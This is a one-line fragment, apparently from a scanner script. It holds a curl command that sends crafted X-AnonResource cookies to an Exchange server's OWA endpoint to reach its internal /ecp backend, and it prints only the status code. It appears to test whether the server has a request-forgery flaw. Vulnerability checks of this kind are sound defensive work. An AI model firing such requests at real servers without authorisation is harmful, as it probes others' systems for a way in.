"
curl -sk -H "Transfer-Encoding: chunked" -d "" -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;" https://{EXCHANGE_HOST}/owa/auth/x.js -o /dev/null -w "%{http_code}
"

